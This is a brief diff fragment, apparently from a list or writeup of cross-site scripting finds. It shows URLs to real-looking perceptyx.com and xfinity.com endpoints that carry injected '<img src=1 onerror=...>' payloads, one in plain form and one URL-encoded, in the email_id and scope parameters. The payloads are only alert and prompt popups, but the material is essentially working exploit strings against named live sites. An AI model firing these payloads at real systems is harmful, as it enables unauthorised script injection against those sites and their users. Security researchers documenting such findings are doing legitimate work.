@@ -20,3 +20,6 @@
 
 8 https://www.perceptyx.com/amdes239/dc/?action=je9c5&api=ils9b&c=orsbf&categoryid=aa3e7&csrf_token=wbxhj&email_id=21"> <img src=1 onerror=alert()> &emerge_id=40914&id=mjvuj&jsonp=qu8nm&key=fbr23&lang=zh&list_type=g5bnz&m=tbaaa&page=aemgx&password=n02g7&q=og8fg&redirect=qjbig&region=j93b0&rm=translate_email&s=h70pq&token=n29p7&unsubscribe_token=gjsvw&view=dz8ym&year=ddxa8
 ```
+
+
+https://xerxes.traxion.xfinity.com/xerxes-sp/protected/auth?client_id=iee-rss&response_type=code&continue=https://iee-rss-dev.apps.xcal.tv/&scope=111%22%3E%3Cimg%20src%3d1%20onerror%3dprompt%28%29%3E%2f%2f
